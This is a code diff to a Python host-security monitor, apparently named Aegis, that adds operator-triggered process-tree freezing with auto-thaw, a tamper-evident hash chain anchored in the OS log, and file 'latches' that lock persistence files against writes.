@@ -1071,6 +1071,11 @@ if IS_MAC:
         "sysctl": "/usr/sbin/sysctl", "xattr": "/usr/bin/xattr",
         "netstat": "/usr/sbin/netstat", "last": "/usr/bin/last",
         "who": "/usr/bin/who",
+        # Protective tier: `logger` is the unprivileged-append half of the
+        # notary (the log store itself is root-owned), pbpaste/pbcopy the
+        # clipboard surface.
+        "logger": "/usr/bin/logger", "pbpaste": "/usr/bin/pbpaste",
+        "pbcopy": "/usr/bin/pbcopy",
     }
 elif IS_LINUX:
     # Distros disagree on /usr/bin vs /bin (usrmerge) and /usr/sbin vs /sbin;
@@ -1086,7 +1091,10 @@ elif IS_LINUX:
                                 "systemctl", "loginctl", "getenforce",
                                 "aa-enabled", "ufw", "firewall-cmd", "nft",
                                 "dpkg", "dpkg-query", "rpm", "pacman",
-                                "sestatus", "notify-send")}
+                                "sestatus", "notify-send",
+                                # protective tier
+                                "logger", "journalctl", "xclip", "wl-paste",
+                                "wl-copy")}
 else:
     _SYS32 = os.path.join(WIN_SYSTEMROOT, "System32")
     _TRUSTED_TOOLS = {
@@ -1099,6 +1107,10 @@ else:
         "sc": os.path.join(_SYS32, "sc.exe"),
         "powershell": os.path.join(_SYS32, "WindowsPowerShell", "v1.0",
                                    "powershell.exe"),
+        # Protective tier: icacls sets the deny-write ACE a latch is made of,
+        # eventcreate is the unprivileged-append half of the notary.
+        "icacls": os.path.join(_SYS32, "icacls.exe"),
+        "eventcreate": os.path.join(_SYS32, "eventcreate.exe"),
     }
 
 
@@ -3799,20 +3811,46 @@ def _iter_processes():
                 continue
             yield pid.strip(), owner.strip(), exe.strip(), (argv.strip() or exe.strip())
         return
-    out, _, rc = run(["ps", "-axo", "pid=,uid=,comm=,args="], timeout=15)
+    # TWO ps calls, joined on pid, and the reason is not stylistic.
+    #
+    # `ps -axo pid=,uid=,comm=,args=` truncates the comm COLUMN to 16 characters
+    # — but only because `args` is requested alongside it. Asked for on its own,
+    # comm is the full path (measured: 119 characters, intact). The single-call
+    # form therefore returned an executable path that DOES NOT EXIST for 305 of
+    # 642 processes on the author's machine (47%), and every consumer downstream
+    # scored that truncated string: classify_signature() on a path that isn't
+    # there answers `missing`, and is_risky_location() answers False for a
+    # binary genuinely running out of a risky directory. The process sensor was
+    # grading a prefix.
+    #
+    # comm cannot be split off as a token when it shares a line with args (a
+    # path may contain spaces), which is exactly why the original collapsed them
+    # into one call. Keeping them in SEPARATE calls removes the ambiguity: comm
+    # is the whole remainder of its line, argv is the whole remainder of its own.
+    out, _, rc = run(["ps", "-axo", "pid=,uid=,comm="], timeout=15)
     if rc != 0:
         _PROC_ENUM_FAILED = True  # same rule on mac: no answer != no processes
         return
+    exes = {}
     for line in out.splitlines():
         parts = line.split(None, 2)
         if len(parts) < 3:
             continue
-        pid, uid, rest = parts
-        # `comm` is the full exec path and may contain spaces, so it cannot be
-        # split off as a token; argv[0] repeats it, making `rest` usable as both
-        # the argv string and (via its head) the exec path.
-        exe = rest.split(None, 1)[0]
-        yield pid, uid, exe, rest
+        pid, uid, comm = parts[0], parts[1], parts[2].strip()
+        exes[pid] = (uid, comm)
+
+    aout, _, arc = run(["ps", "-axo", "pid=,args="], timeout=15)
+    argvs = {}
+    if arc == 0:
+        for line in aout.splitlines():
+            parts = line.split(None, 1)
+            if len(parts) == 2:
+                argvs[parts[0]] = parts[1].strip()
+    # A failed argv call is NOT a reason to drop the process table: exec path,
+    # owner and the same-user boundary all still hold without argv. The argv
+    # sensors simply see nothing rather than seeing something wrong.
+    for pid, (uid, comm) in exes.items():
+        yield pid, uid, comm, (argvs.get(pid) or comm)
 
 
 def _own_owner():
@@ -7161,6 +7199,12 @@ def gather_all(baseline_snap, current_snap, health=None):
         ("staging", check_staging, ()),
         ("supply-chain", check_supply_chain, ()),
         ("canary", check_canaries, ()),
+        # Protective-tier sensors. Each returns [] unless its mechanism has been
+        # deliberately armed, so a machine that never opts in sees byte-identical
+        # scan behaviour — the opt-in is the arming, not a config flag.
+        ("latch", check_latches, ()),
+        ("decoy", check_decoys, ()),
+        ("assay", check_assay, ()),
         ("outbound", check_outbound, ()),
         ("web-protection", check_web_protection, ()),
         ("hardening", check_hardening, ()),
@@ -7488,6 +7532,24 @@ def _cmd_scan_locked(quiet=False):
                       sensor_health=persisted_health)
     flush_sigcache()
     record_selfstate()
+    # Extend the tamper-evidence chain AFTER state is settled, so the link
+    # commits to what this scan actually concluded. Best-effort: a notary that
+    # could fail a scan would be a liability, not a control.
+    try:
+        notary_append()
+    except Exception as e:
+        log_run("notary append skipped: %s" % e)
+    # Raw sensor input for `rehunt` — the derived findings are already durable;
+    # this keeps what they were DERIVED FROM, which is what lets a later
+    # detector be replayed over history it was not present for.
+    record_observation("persistence.snapshot", current)
+    # Release any frozen tree that outlived its review deadline. Fail-open is
+    # the contract: a scan is the most reliable recurring tick this tool has,
+    # so it is where the deadline is honoured.
+    try:
+        _thaw_expired()
+    except Exception as e:
+        log_run("auto-thaw check failed: %s" % e)
     # Dead-man's-switch beat: a completed scan is proof of life. Its ABSENCE is
     # what an external watcher / peer agent / `aegis.py watchdog` alarms on — the
     # one signal a same-uid attacker who kills or boots-out Aegis can't suppress
@@ -9597,6 +9659,1585 @@ def _neutralize_launchd(plist_path):
 
 
 # --------------------------------------------------------------------------- #
+# PROTECTIVE TIER (opt-in, by-hand) — pre-commitment, reversible containment,
+# and tamper-evidence.
+#
+# Everything above this line is DETECT: observe residue, correlate, report. This
+# section is the answer to the honest limitation that produced: an unprivileged
+# process cannot VETO an event, because a veto is irreversible and the kernel is
+# the only thing entitled to arbitrate one. It can, however:
+#
+#   * pre-commit  — make the attacker's next write FAIL, before any event
+#                   (latches on persistence surfaces, FIFO decoys on the
+#                   credential paths a stealer hardcodes),
+#   * contain     — SUSPEND a same-user process tree. A freeze is REVERSIBLE, so
+#                   it needs no arbitration, so it needs no privilege — and
+#                   because being wrong costs one SIGCONT rather than a lost
+#                   workday, it can fire on evidence far weaker than any
+#                   irreversible action could justify,
+#   * witness     — chain its own state into a log store owned by root, which a
+#                   same-uid attacker may append to but cannot edit or erase.
+#
+# The boundary that does NOT move: none of this runs automatically off a
+# heuristic. Every verb here is a command the operator types after reviewing a
+# finding, exactly like quarantine/kill/neutralize. The architecture invariant
+# ("no LLM or heuristic automatically takes response authority") is unchanged;
+# what is new is that the operator now has reversible verbs to reach for.
+# --------------------------------------------------------------------------- #
+
+FROZEN_FILE = os.path.join(STATE_DIR, "frozen.json")
+LATCH_FILE = os.path.join(STATE_DIR, "latches.json")
+DECOY_FILE = os.path.join(STATE_DIR, "decoys.json")
+ASSAY_FILE = os.path.join(STATE_DIR, "assay.json")
+NOTARY_FILE = os.path.join(STATE_DIR, "notary.jsonl")
+CLIPBOARD_FILE = os.path.join(STATE_DIR, "clipboard.json")
+OBSERVATIONS_DIR = os.path.join(STATE_DIR, "observations")
+
+# A frozen tree is released automatically after this long even if nobody
+# reviews it. Fail-OPEN is deliberate and documented: a monitor that can
+# silently leave the user's processes suspended forever is a worse failure than
+# one that lets a suspect resume — the freeze buys review time, it is not a jail.
+FREEZE_AUTO_THAW_SECS = 900
+# Descendant-sweep bound. A process forking faster than the sweep converges is
+# itself the finding; looping forever chasing it is not containment.
+FREEZE_MAX_PASSES = 5
+
+
+def _iter_parents():
+    """{pid: ppid} for every process this user can see — the edge set
+    _iter_processes() deliberately omits. Same per-OS split, same cost."""
+    out = {}
+    if IS_LINUX:
+        try:
+            pids = [d for d in os.listdir("/proc") if d.isdigit()]
+        except Exception:
+            return out
+        for pid in pids:
+            try:
+                with open("/proc/%s/stat" % pid, encoding="utf-8",
+                          errors="replace") as f:
+                    data = f.read()
+            except Exception:
+                continue
+            # comm sits in parens and may itself contain spaces AND parens, so
+            # the fields are counted from the LAST ')': state, then ppid.
+            tail = data[data.rfind(")") + 1:].split()
+            if len(tail) >= 2:
+                out[pid] = tail[1]
+        return out
+    if IS_WIN:
+        o, _e, rc = run(["powershell", "-NoProfile", "-NonInteractive",
+                         "-Command", _WIN_PPID_PS], timeout=120)
+        if rc != 0 or not o:
+            return out
+        for line in o.splitlines():
+            parts = line.rstrip("\r").split("\t")
+            if len(parts) >= 2 and parts[0].strip().isdigit():
+                out[parts[0].strip()] = parts[1].strip()
+        return out
+    o, _e, rc = run(["ps", "-axo", "pid=,ppid="], timeout=15)
+    if rc != 0:
+        return out
+    for line in (o or "").splitlines():
+        parts = line.split()
+        if len(parts) >= 2 and parts[0].isdigit():
+            out[parts[0]] = parts[1]
+    return out
+
+
+_WIN_PPID_PS = (
+    "$t=[char]9;Get-CimInstance Win32_Process | ForEach-Object {"
+    "(($_.ProcessId),($_.ParentProcessId)) -join $t}")
+
+
+def _own_ancestors(parents=None):
+    """Every pid on the chain from this process up to init, as strings.
+
+    Freezing any of them is self-destruction with extra steps: our own parent is
+    the shell, whose parent is the terminal. Suspending those looks exactly like
+    a hung machine to the operator, and on the Aegis pid itself it would strand
+    every other frozen tree past its auto-thaw deadline."""
+    parents = _iter_parents() if parents is None else parents
+    out, cur, guard = set(), str(os.getpid()), 0
+    while cur and cur not in out and guard < 64:
+        out.add(cur)
+        cur = parents.get(cur)
+        guard += 1
+    return out
+
+
+def _suspend_pid(pid):
+    """Reversibly stop one pid. True on success."""
+    try:
+        if IS_WIN:
+            import ctypes
+            # PROCESS_SUSPEND_RESUME (0x0800) is granted to the caller for its
+            # OWN user's processes; no admin token is involved.
+            return _win_suspend_resume(pid, "NtSuspendProcess")
+        import signal as _signal
+        os.kill(int(pid), _signal.SIGSTOP)
+        return True
+    except Exception:
+        return False
+
+
+def _win_suspend_resume(pid, ntdll_func):
+    """Suspend or resume a same-user pid through ntdll, with the ctypes
+    prototypes declared explicitly.
+
+    Declaring argtypes/restype is not ceremony here. ctypes defaults a function's
+    restype to C `int` (32-bit), but a Win64 HANDLE is a 64-bit pointer — so the
+    handle from OpenProcess is silently truncated, and the truncated value is
+    then passed back to NtSuspendProcess and CloseHandle at the wrong width.
+    Small handle values survive that by luck, which is precisely what makes it a
+    bug that ships: it works on the developer's box and fails on someone's.
+    c_void_p pins the width; NTSTATUS is a signed LONG where < 0 is failure."""
+    import ctypes
+    from ctypes import wintypes
+    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
+
+    k32.OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
+    k32.OpenProcess.restype = ctypes.c_void_p
+    k32.CloseHandle.argtypes = (ctypes.c_void_p,)
+    k32.CloseHandle.restype = wintypes.BOOL
+
+    fn = getattr(ntdll, ntdll_func)
+    fn.argtypes = (ctypes.c_void_p,)
+    fn.restype = ctypes.c_long          # NTSTATUS
+
+    PROCESS_SUSPEND_RESUME = 0x0800
+    handle = k32.OpenProcess(PROCESS_SUSPEND_RESUME, False, int(pid))
+    if not handle:
+        return False
+    try:
+        return fn(handle) >= 0
+    finally:
+        k32.CloseHandle(handle)
+
+
+def _resume_pid(pid):
+    """Release one suspended pid. True on success."""
+    try:
+        if IS_WIN:
+            return _win_suspend_resume(pid, "NtResumeProcess")
+        import signal as _signal
+        os.kill(int(pid), _signal.SIGCONT)
+        return True
+    except Exception:
+        return False
+
+
+# The comms freeze must never suspend. Deliberately NOT _PROTECTED_COMMS
+# verbatim: that set carries the generic interpreter names ("python", "python3",
+# "aegis.py", …) as a blunt proxy for "do not kill Aegis itself", which is the
+# right call for an IRREVERSIBLE verb reached by name. Freeze does not need the
+# proxy — it already refuses its own pid and every ancestor structurally, which
+# is strictly more precise — and inheriting it would refuse to suspend any
+# python process at all. Interpreted payloads are a large share of what this
+# tier exists to contain, so that would gut the feature to re-buy protection it
+# already has.
+_FREEZE_NEVER_COMMS = _PROTECTED_COMMS - frozenset((
+    "aegis.py", "python3", "python", "python.exe", "pythonw.exe"))
+
+
+def _process_owner_and_names(pid):
+    """(owner, names) for `pid` from ONE process-table walk.
+
+    Deliberately not `_process_identity()` + `_process_names()`: those are two
+    full enumerations, and _freeze_refusal is called once per descendant during
+    a tree sweep. On Windows a single enumeration is a CIM query this codebase
+    measured at 41s for 135 processes, so the doubled version turns freezing a
+    small tree into minutes of latency — for a verb whose entire value is that
+    it lands before the payload finishes."""
+    owner, names = None, set()
+    for p, o, exe, argv in _iter_processes():
+        if p != str(pid):
+            continue
+        owner = o
+        if exe:
+            names.add(os.path.basename(exe))
+        if argv:
+            # argv may be prefixed by ps's truncated comm token, so test both
+            # the first and second tokens; it costs nothing and a guard should
+            # over-refuse rather than under-refuse.
+            parts = argv.split()
+            for tok in parts[:2]:
+                names.add(os.path.basename(tok))
+        break
+    return owner, {n for n in names if n}
+
+
+def _process_names(pid):
+    """Every plausible name for `pid`, for matching against _PROTECTED_COMMS.
+
+    Why this exists rather than just using _process_identity's `comm`: macOS
+    `ps` truncates the `comm` column to 16 characters WHEN `args` is requested
+    in the same call, which is exactly how _iter_processes queries it. So
+    `/System/.../MacOS/Terminal` arrives as `/System/Applicat` and basenames to
+    `Applicat`, which matches nothing in _PROTECTED_COMMS. The full argv[0] is
+    NOT truncated, so it is the reliable source. Both are returned because
+    either one matching is enough to refuse — a guard should over-refuse, never
+    under-refuse."""
+    return _process_owner_and_names(pid)[1]
+
+
+def _freeze_refusal(pid, parents=None):
+    """Why `pid` must not be frozen, or None if it may be. Mirrors cmd_kill's
+    guards — same-user only, never self/init/session-critical — plus the one
+    guard freeze needs that kill does not: never an ANCESTOR of this process."""
+    try:
+        pid_i = int(pid)
+    except Exception:
+        return "not a pid: %s" % pid
+    if pid_i in (0, 1, 4, os.getpid()):
+        return "pid %d is self/init and is never suspendable" % pid_i
+    if str(pid_i) in _own_ancestors(parents):
+        return ("pid %d is an ancestor of Aegis (your shell or terminal); "
+                "suspending it would look identical to a hung machine" % pid_i)
+    owner, names = _process_owner_and_names(pid_i)   # ONE table walk, not two
+    if owner is None:
+        return "no such process: %d" % pid_i
+    if not _same_owner(owner):
+        return ("pid %d belongs to %s, not you; Aegis only acts on your own "
+                "processes" % (pid_i, owner))
+    protected = names & _FREEZE_NEVER_COMMS
+    if protected:
+        return ("pid %d is a session-critical process (%s)"
+                % (pid_i, sorted(protected)[0]))
+    return None
+
+
+def _freeze_tree(root_pid):
+    """Suspend `root_pid` and every same-user descendant, to a fixpoint.
+
+    ORDER is the whole mechanism: the root stops FIRST, because a stopped parent
+    cannot fork, which turns an unbounded chase into a converging sweep. Returns
+    (frozen_pids, converged)."""
+    frozen, refused = [], []
+    if _suspend_pid(root_pid):
+        frozen.append(str(root_pid))
+    else:
+        return [], True
+    # Membership sets alongside the ordered list: the sweep tests every pid on
+    # the machine against these once per pass, and `in list` would make that
+    # quadratic in the size of the frozen set for no reason.
+    frozen_set, refused_set = {str(root_pid)}, set()
+    converged = False
+    for _pass in range(FREEZE_MAX_PASSES):
+        parents = _iter_parents()
+        found = set()
+        for pid, ppid in parents.items():
+            if ppid in frozen_set and pid not in frozen_set \
+                    and pid not in refused_set:
+                found.add(pid)
+        if not found:
+            converged = True
+            break
+        for pid in sorted(found, key=lambda p: int(p) if p.isdigit() else 0):
+            if _freeze_refusal(pid, parents) is not None:
+                refused.append(pid)
+                refused_set.add(pid)
+                continue
+            if _suspend_pid(pid):
+                frozen.append(pid)
+                frozen_set.add(pid)
+            else:
+                refused.append(pid)
+                refused_set.add(pid)
+    return frozen, converged
+
+
+def _load_frozen():
+    data = load_json(FROZEN_FILE, {})
+    return data if isinstance(data, dict) else {}
+
+
+def cmd_freeze(pid, reason="manual"):
+    """Suspend a same-user process TREE, reversibly, pending review.
+
+    This is the containment verb an unprivileged tool is actually entitled to.
+    It stops new reads, new connections and new forks immediately. It does NOT
+    un-send bytes already handed to the kernel's socket buffers — freeze
+    contains an attack in progress, it does not rewind one."""
+    ensure_state()
+    _thaw_expired()
+    refusal = _freeze_refusal(pid)
+    if refusal is not None:
+        print("refuse: %s" % refusal)
+        log_action("freeze", str(pid), "refused")
+        return 1
+    owner, comm = _process_identity(pid)
+    if not log_action("freeze", str(pid), "prepared", comm=comm, reason=reason):
+        print("refuse: could not durably record the action; not freezing.")
+        return 1
+    frozen, converged = _freeze_tree(pid)
+    if not frozen:
+        print("could not suspend pid %s (it may have exited)" % pid)
+        log_action("freeze", str(pid), "failed", comm=comm)
+        return 1
+
+    state = _load_frozen()
+    fid = "f%d" % _epoch()
+    while fid in state:
+        fid += "x"
+    state[fid] = {"root": str(pid), "pids": frozen, "comm": comm,
+                  "reason": reason, "ts": _epoch(),
+                  "auto_thaw_at": _epoch() + FREEZE_AUTO_THAW_SECS,
+                  "converged": converged}
+    save_json(FROZEN_FILE, state)
+    log_action("freeze", str(pid), "ok", comm=comm, frozen=len(frozen),
+               freeze_id=fid, converged=converged)
+    print("Froze %d process(es) rooted at pid %s (%s) as %s."
+          % (len(frozen), pid, comm, fid))
+    if not converged:
+        # A tree still growing after the bound is not a tidy containment; say so
+        # rather than let a clean-looking count imply the sweep finished.
+        print("  WARNING: the tree was still spawning after %d passes — some "
+              "descendants may be running. Review now, do not wait."
+              % FREEZE_MAX_PASSES)
+    print("  Review:  aegis.py frozen\n"
+          "  Release: aegis.py thaw %s\n"
+          "  Auto-releases in %d minutes if you do nothing (fail-open)."
+          % (fid, FREEZE_AUTO_THAW_SECS // 60))
+    return 0
+
+
+def cmd_thaw(fid=None):
+    """Release a frozen tree (or every frozen tree with `all`)."""
+    ensure_state()
+    state = _load_frozen()
+    if not state:
+        print("Nothing is frozen.")
+        return 0
+    targets = list(state) if fid in (None, "all") else [fid]
+    rc = 0
+    for target in targets:
+        rec = state.get(target)
+        if not rec:
+            print("no such freeze: %s" % target)
+            rc = 1
+            continue
+        released = sum(1 for p in rec.get("pids", []) if _resume_pid(p))
+        del state[target]
+        log_action("thaw", target, "ok", released=released,
+                   root=rec.get("root"))
+        print("Released %d of %d process(es) from %s (%s)."
+              % (released, len(rec.get("pids", [])), target,
+                 rec.get("comm") or "?"))
+    save_json(FROZEN_FILE, state)
+    return rc
+
+
+def _thaw_expired():
+    """Release freezes past their deadline. The fail-open half of the contract:
+    if the operator never reviews, or Aegis itself died between freeze and
+    review, the suspects resume rather than staying stopped forever."""
+    state = _load_frozen()
+    if not state:
+        return 0
+    now, expired = _epoch(), []
+    for fid, rec in state.items():
+        if now >= rec.get("auto_thaw_at", 0):
+            expired.append(fid)
+    for fid in expired:
+        rec = state.pop(fid)
+        released = sum(1 for p in rec.get("pids", []) if _resume_pid(p))
+        log_action("thaw", fid, "auto-expired", released=released,
+                   root=rec.get("root"))
+    if expired:
+        save_json(FROZEN_FILE, state)
+    return len(expired)
+
+
+def cmd_frozen():
+    """The review queue. Deferred consent is the point: the question moves from
+    'adjudicate this modal NOW, mid-attack' to 'read this at a time you choose,
+    with the suspect stopped and having accomplished nothing meanwhile'."""
+    ensure_state()
+    _thaw_expired()
+    state = _load_frozen()
+    if not state:
+        print("Nothing is frozen.")
+        return 0
+    now = _epoch()
+    print("# Frozen process trees (%d)\n" % len(state))
+    for fid, rec in sorted(state.items(), key=lambda kv: kv[1].get("ts", 0)):
+        left = max(0, rec.get("auto_thaw_at", 0) - now)
+        alive = [p for p in rec.get("pids", []) if _process_alive(p)]
+        print("  %s  root pid %s (%s)\n"
+              "      %d pid(s), %d still resident · reason: %s\n"
+              "      frozen %s · auto-release in %dm%s"
+              % (fid, rec.get("root"), rec.get("comm") or "?",
+                 len(rec.get("pids", [])), len(alive),
+                 rec.get("reason") or "manual",
+                 _ts_short(rec.get("ts")), left // 60,
+                 "" if rec.get("converged", True)
+                 else " · SWEEP DID NOT CONVERGE"))
+        for pid in rec.get("pids", [])[:12]:
+            _owner, comm = _process_identity(pid)
+            print("        - pid %s %s" % (pid, comm or "(exited)"))
+    print("\nRelease: aegis.py thaw <id>   |   Terminate: aegis.py kill <pid>")
+    return 0
+
+
+def _ts_short(epoch_val):
+    try:
+        return datetime.fromtimestamp(int(epoch_val)).strftime("%H:%M:%S")
+    except Exception:
+        return "?"
+
+
+# --- Notary: hash chain anchored in a log store the attacker cannot edit ----- #
+#
+# Unprivileged Tripwire/AIDE clones die for one reason: the baseline and the
+# checker share a uid with the adversary, so the answer key is rewritable. The
+# fix is not a better secret — a same-uid attacker reads any secret we hold — it
+# is a WITNESS in a different trust domain. Every platform ships one: a log
+# daemon running as root that accepts unprivileged appends and refuses
+# unprivileged edits or erasure.
+#
+# What this buys, stated precisely, because the difference matters:
+#   * ERASURE-resistant: yes. Removing an anchor needs root.
+#   * FORGERY-resistant: only partly. A same-uid attacker can write plausible
+#     anchor lines AND rewrite the local chain to match. The MAC raises that
+#     from trivial to deliberate (they must also read hmac.key), but it does not
+#     close it. What the attacker cannot do is make a PAST anchor say something
+#     else, so silencing Aegis leaves a sequence gap they cannot backfill.
+# The honest claim is therefore "an attacker who tampers must do so loudly",
+# never "the record is cryptographically unforgeable".
+
+_NOTARY_TAG = "aegis-notary"
+_NOTARY_MARK = "AEGIS-ANCHOR"
+
+
+def _notary_state_digest():
+    """One digest over the state whose silent mutation would matter: the trust
+    stores, the self-protection watermark, and the open-incident set."""
+    h = hashlib.sha256()
+    for path in (BASELINE, ALLOWLIST, SELFSTATE):
+        try:
+            with open(path, "rb") as f:
+                h.update(hashlib.sha256(f.read()).digest())
+        except Exception:
+            h.update(b"\x00" * 32)
+    try:
+        rows = list_incidents(active_only=True)
+        h.update(json.dumps(sorted(str(r.get("id")) for r in rows)).encode())
+    except Exception:
+        h.update(b"no-incidents")
+    return h.hexdigest()
+
+
+def _notary_chain():
+    """The local chain, oldest first. Malformed lines are kept as None so a
+    truncation shows up as a gap instead of silently renumbering."""
+    out = []
+    try:
+        with open(NOTARY_FILE, "r", encoding="utf-8") as f:
+            for line in f:
+                line = line.strip()
+                if not line:
+                    continue
+                try:
+                    out.append(json.loads(line))
+                except Exception:
+                    out.append(None)
+    except Exception:
+        return []
+    return out
+
+
+def _notary_link_mac(seq, prev, state):
+    return hmac.new(_hmac_key(),
+                    ("%d|%s|%s" % (seq, prev, state)).encode(),
+                    hashlib.sha256).hexdigest()
+
+
+def _notary_emit_anchor(seq, head):
+    """Append one anchor to the platform's own log store. Returns a status
+    string; 'absent' where no unprivileged append channel exists, which is
+    reported as absent rather than as a broken sensor."""
+    line = "%s seq=%d head=%s" % (_NOTARY_MARK, seq, head)
+    if IS_WIN:
+        # The Task Scheduler channel already records every Aegis run and cannot
+        # be cleared without admin, so an attendance chain exists on Windows even
+        # when Application-log source registration is unavailable to this user.
+        _o, _e, rc = run(["eventcreate", "/T", "INFORMATION", "/ID", "1",
+                          "/L", "APPLICATION", "/SO", _NOTARY_TAG,
+                          "/D", line], timeout=30)
+        return "ok" if rc == 0 else "unavailable"
+    _o, _e, rc = run(["logger", "-t", _NOTARY_TAG, line], timeout=15)
+    return "ok" if rc == 0 else "unavailable"
+
+
+def _notary_read_anchors(hours=24):
+    """Read anchors back OUT of the platform log store as {seq: head}."""
+    seen = {}
+    if IS_MAC:
+        # `process == "logger"` is an INDEXED predicate; the obvious
+        # `eventMessage CONTAINS "AEGIS-ANCHOR"` is a full-text scan of the
+        # whole archive and was measured at >120s (vs ~4s) against a 1.7GB
+        # store on the author's machine. Same result set, two orders of
+        # magnitude apart — the marker is then matched in-process below.
+        out, _e, rc = run(["log", "show", "--style", "syslog",
+                           "--last", "%dh" % hours,
+                           "--predicate", 'process == "logger"'],
+                          timeout=90)
+    elif IS_LINUX:
+        out, _e, rc = run(["journalctl", "-t", _NOTARY_TAG,
+                           "--since", "-%dh" % hours, "--no-pager"],
+                          timeout=60)
+    else:
+        out, _e, rc = run(["powershell", "-NoProfile", "-NonInteractive",
+                           "-Command",
+                           "Get-WinEvent -FilterHashtable @{LogName='Application';"
+                           "ProviderName='%s'} -ErrorAction SilentlyContinue | "
+                           "ForEach-Object { $_.Message }" % _NOTARY_TAG],
+                          timeout=120)
+    if rc != 0 or not out:
+        return None  # channel unavailable — distinct from "no anchors found"
+    for m in re.finditer(r"%s seq=(\d+) head=([0-9a-f]{16,64})" % _NOTARY_MARK,
+                         out):
+        seen[int(m.group(1))] = m.group(2)
+    return seen
+
+
+def notary_append():
+    """Extend the chain by one link and anchor it. Called from scan; safe to
+    call by hand. Returns the new link."""
+    ensure_state()
+    chain = _notary_chain()
+    valid = [c for c in chain if isinstance(c, dict)]
+    seq = (valid[-1]["seq"] + 1) if valid else 1
+    prev = valid[-1]["head"] if valid else ("0" * 64)
+    state = _notary_state_digest()
+    head = hashlib.sha256(("%s|%s" % (prev, state)).encode()).hexdigest()
+    link = {"seq": seq, "prev": prev, "state": state, "head": head,
+            "mac": _notary_link_mac(seq, prev, state), "ts": _epoch()}
+    data = (json.dumps(link, sort_keys=True) + "\n").encode("utf-8")
+    try:
+        _rotate_log(NOTARY_FILE)
+        fd = os.open(NOTARY_FILE, os.O_WRONLY | os.O_APPEND | os.O_CREAT, 0o600)
+        try:
+            os.write(fd, data)
+            _sync_fd(fd)
+        finally:
+            os.close(fd)
+    except Exception as e:
+        log_run("notary append failed: %s" % e)
+        return None
+    link["anchor"] = _notary_emit_anchor(seq, head)
+    return link
+
+
+def _notary_verify():
+    """Reconcile the local chain against itself and against the OS log store.
+
+    Returns (problems, checked, anchors_status)."""
+    chain = _notary_chain()
+    problems = []
+    if not chain:
+        return problems, 0, "empty"
+    prev_head, expect_seq = "0" * 64, None
+    for idx, link in enumerate(chain):
+        if not isinstance(link, dict):
+            problems.append("link %d is unparseable (truncated or overwritten)"
+                            % idx)
+            continue
+        seq, prev, state = link.get("seq"), link.get("prev"), link.get("state")
+        if expect_seq is not None and seq != expect_seq:
+            problems.append("sequence gap: expected seq=%s, found seq=%s — the "
+                            "monitor was stopped, or links were removed"
+                            % (expect_seq, seq))
+        expect_seq = (seq + 1) if isinstance(seq, int) else None
+        if prev != prev_head:
+            problems.append("seq=%s does not chain to its predecessor" % seq)
+        head = hashlib.sha256(("%s|%s" % (prev, state)).encode()).hexdigest()
+        if head != link.get("head"):
+            problems.append("seq=%s head does not match its own contents" % seq)
+        if not hmac.compare_digest(_notary_link_mac(seq, prev, state),
+                                   link.get("mac") or ""):
+            problems.append("seq=%s MAC does not verify — the chain was edited "
+                            "by something without the local key" % seq)
+        prev_head = link.get("head") or prev_head
+
+    anchors = _notary_read_anchors()
+    if anchors is None:
+        return problems, len(chain), "unavailable"
+    if not anchors:
+        return problems, len(chain), "none-retained"
+    matched = 0
+    for link in chain:
+        if not isinstance(link, dict):
+            continue
+        want = anchors.get(link.get("seq"))
+        if want is None:
+            continue  # aged out of the log store's retention — not evidence
+        matched += 1
+        if want != link.get("head"):
+            problems.append(
+                "seq=%s: the anchor in the OS log store says head=%s but the "
+                "local chain says head=%s — the local chain was rewritten"
+                % (link.get("seq"), want[:16], (link.get("head") or "?")[:16]))
+    return problems, len(chain), "ok:%d-anchors-matched" % matched
+
+
+def cmd_notary(action="verify"):
+    """Verify (or extend) the tamper-evidence chain."""
+    ensure_state()
+    if action == "append":
+        link = notary_append()
+        if not link:
+            print("notary: could not append (see run.log)")
+            return 1
+        print("notary: seq=%d head=%s anchor=%s"
+              % (link["seq"], link["head"][:16], link.get("anchor")))
+        return 0
+    problems, checked, anchors = _notary_verify()
+    print("# Aegis notary — %d local link(s), OS-log anchors: %s\n"
+          % (checked, anchors))
+    if anchors == "unavailable":
+        print("NOTE: this platform's log store could not be read back, so the "
+              "external half of the check did not run. The local chain was "
+              "still verified.\n")
+    elif anchors == "empty":
+        print("No chain yet. It is written on each scan once you run one.\n")
+    if problems:
+        print("TAMPER EVIDENCE (%d):" % len(problems))
+        for p in problems:
+            print("  ! %s" % p)
+        print("\nWhat this does and does not prove: erasing an anchor requires "
+              "root, so a gap is real evidence. Writing a NEW anchor does not — "
+              "a same-uid attacker with the local key can forge a consistent "
+              "pair. Treat this as 'tampering was not silent', not as proof of "
+              "an unforgeable record.")
+        return 2
+    print("No tamper evidence. Chain is internally consistent%s."
+          % (" and agrees with the OS log store" if anchors.startswith("ok:")
+             else ""))
+    return 0
+
+
+# --- Latches: pre-commitment on the persistence surfaces -------------------- #
+#
+# The detect tier watches these paths and reports a write after it lands. A
+# latch makes the write FAIL. macOS `chflags uchg` and a Windows deny-write ACE
+# are both settable by the file's own owner with no privilege at all; Linux has
+# no unprivileged immutable flag (chattr +i needs CAP_LINUX_IMMUTABLE), so there
+# it is a mode change — a speed bump, and labelled as one rather than sold as
+# equivalent.
+#
+# The second half is what makes this a detector rather than mere hardening:
+# nothing benign clears these. A latch found cleared with no matching `unlatch`
+# in the audit log is attack-defined evidence, not a heuristic.
+
+
+def _latch_targets():
+    """Persistence surfaces worth pre-claiming, that exist on this machine."""
+    out = []
+    for d in PERSISTENCE_DIRS:
+        if os.path.isdir(d):
+            out.append(d)
+    for rel in (".zshrc", ".zprofile", ".zshenv", ".bashrc", ".bash_profile",
+                ".profile"):
+        p = os.path.join(HOME, rel)
+        if os.path.isfile(p):
+            out.append(p)
+    return out
+
+
+def _latch_apply(path):
+    """Make `path` unwritable by this user. Returns (mode_str, detail)."""
+    if IS_MAC:
+        _o, err, rc = run(["chflags", "uchg", path], timeout=20)
+        return ("uchg", None) if rc == 0 else (None, (err or "").strip())
+    if IS_WIN:
+        user = os.environ.get("USERNAME") or ""
+        if not user:
+            return None, "no USERNAME in environment"
+        _o, err, rc = run(["icacls", path, "/deny", "%s:(WD,AD)" % user],
+                          timeout=30)
+        return ("acl", None) if rc == 0 else (None, (err or "").strip())
+    try:
+        original = stat.S_IMODE(os.stat(path).st_mode)
+        os.chmod(path, 0o500 if os.path.isdir(path) else 0o400)
+        return "mode:%o" % original, None
+    except Exception as e:
+        return None, str(e)
+
+
